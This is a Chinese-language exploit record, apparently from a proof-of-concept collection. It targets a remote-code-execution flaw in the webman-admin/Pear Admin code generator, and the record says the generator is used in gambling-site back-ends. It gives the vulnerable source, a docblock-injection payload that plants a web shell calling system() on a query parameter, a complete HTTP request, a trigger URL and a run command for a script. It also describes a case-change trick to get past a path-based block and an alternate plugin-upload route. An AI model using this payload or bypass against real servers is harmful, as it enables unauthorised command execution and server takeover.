# webman-admin TableController::crud 代码生成器 docblock 注入 → 写 app/controller/*.php → Monitor 热重载 RCE

- **code**: webman-admin-tablecontroller-crud-代码生成器-docblock-注入-写-app-controller-.php-monito
- **kind**: exp
- **category**: rce
- **component**: webman-admin / Pear Admin（boyue 系博彩后台）TableController 代码生成器
- **versions**: webman-admin 及派生后台（含 boyue 系）；TableController 存在 createController 的 docblock 拼接即适用
- **severity**: critical
- **language**: http
- **source**: self
- **verified_note**: 机制在 example-com 靶标上由源码 100% 确认（注入点、落点目录、Monitor monitorDir 均核对），但**尚未在真实目标上开火**（缺管理员会话，未发包）。参数构造已本地 dry-run 验证。
- **path**: pocs/webman-admin-tablecontroller-crud-代码生成器-docblock-注入-写-app-controller-.php-monito/table_crud_docblock_inject.py
- **tags**: webman,webman-admin,pear-admin,代码生成器,docblock注入,rce,php
- **created_at**: 2026-10-12T10:57:27.126Z
- **found_by**: exploit

## 描述

webman-admin/Pear Admin 系后台的代码生成器 TableController::crud 把 POST title 未过滤拼进生成控制器的 docblock，可闭合注释注入顶层 PHP；文件落 app/controller/（Monitor 热重载目录），热重载后由默认自动路由触发即命令执行。前提=任意管理员会话。

## 用法

```
python crud_rce.py --token <ADMIN_JWT> --cmd "id" --fire
# 或手工：POST /app/admin/Table/crud （开关拦住时改用 /app/admin/TABLE/CRUD）
# body: {"table":"wa_options","title":"*/if(isset($_GET['c'])){echo 'RCE-OK:';system($_GET['c']);}/**","controller":"/app/controller/<Rand>Controller.php","model":"/app/model/<Rand>.php"}
# 等待 3-5s（Monitor 热重载）后：GET /<rand>/x?c=id
```

## 正文

```
# TableController::crud() —— title 参数 docblock 注入 → 写 app/controller/*.php → RCE

## 缺陷源码（plugin/admin/app/controller/TableController.php）
```php
public function crud(Request $request): Response
{
    $table_name = $request->input('table');
    Util::checkTableName($table_name);          // ^[a-zA-Z_0-9]+$，表名不可注入
    $title = $request->post('title');           // ★ 未做任何过滤
    $controller_file = '/' . trim($request->post('controller', ''), '/');
    $model_file      = '/' . trim($request->post('model', ''), '/');
    $overwrite       = $request->post('overwrite');   // 不传就是新建
    Util::pauseFileMonitor();
    try {
        $this->createModel($model_class, $model_namespace, base_path($model_file), $table_name);
        $this->createController($controller_class, $controller_namespace,
                                base_path($controller_file), $model_class,
                                $model_namespace, $title, $template_path);   // ★ $title 传下去
        ...
```
```php
protected function createController($controller_class, $namespace, $file, $model_class,
                                    $model_namespace, $name, $template_path)
{
    $controller_content = <<<EOF
<?php

namespace $namespace;

use support\Request;
use support\Response;
use $model_namespace\\$model_class_alias;
use plugin\admin\app\controller\Crud;

/**
 * $name                     <-- ★ 直接拼进 docblock
 */
class $controller_class extends Crud
{
    ...
}
EOF;
    file_put_contents($file, $controller_content);   // ★ 写入 app/controller/ 下
}
```

## 为什么能拿权限
`config/process.php` 的 `monitor` 进程把 `app_path()` 放进 `monitorDir`；Monitor 每秒扫一次，发现新 `.php` 且 **`exec('php -l <file>')` 语法通过** 就 `posix_kill(master, SIGUSR1)` 热重载。
写进 `app/controller/` 的控制器在 webman **默认自动路由** `/{controller}/{action}` 被命中时自动加载 → 文件顶层注入代码立即执行。

## 载荷（title）
```
*/if(isset($_GET['c'])){echo 'RCE-OK:';system($_GET['c']);}/** 
```
生成结果（语法合法，php -l 通过）：
```php
/**
 * */
if(isset($_GET['c'])){echo 'RCE-OK:';system($_GET['c']);}
/**
 
 */
class <Rand>Controller extends Crud
{
    ...
}
```

## 完整请求
```http
POST /app/admin/Table/crud HTTP/1.1
Host: <target>
Authorization: Bearer <ADMIN_JWT>
Content-Type: application/json

{"table":"wa_options",
 "title":"*/if(isset($_GET['c'])){echo 'RCE-OK:';system($_GET['c']);}/**",
 "controller":"/app/controller/<Rand>Controller.php",
 "model":"/app/model/<Rand>.php",
 "pid":0}
```
触发：`GET /<rand>/x?c=id` → `RCE-OK:uid=0(root)...`
（注意：`<Rand>` 随机、不带 `overwrite`，只会新建文件，绝不覆盖既有文件；`table` 用真实存在的表如 `wa_options`，controller 路径必须含 `/controller/`、model 以 `.php` 结尾。）

## 可用性/绕过备注
- 若目标装了「功能开关」按精确小写 path 403 拦 `/app/admin/api/table/crud`，**改路由段大小写走默认自动路由**即可命中同一控制器：`/app/admin/Table/crud`。
- 前提：拿到管理员会话（本框架 `plugin/admin/api/Auth::canAccess` 未登录时在判 noNeedAuth 前就 401，无免登录绕过）。
- 同等效果的备用面：`PluginController::install` → `ZipArchive::extractTo(base_path().'/plugin/')` → 可写 `plugin/*/config/*.php`（同属 Monitor 目录）。
```
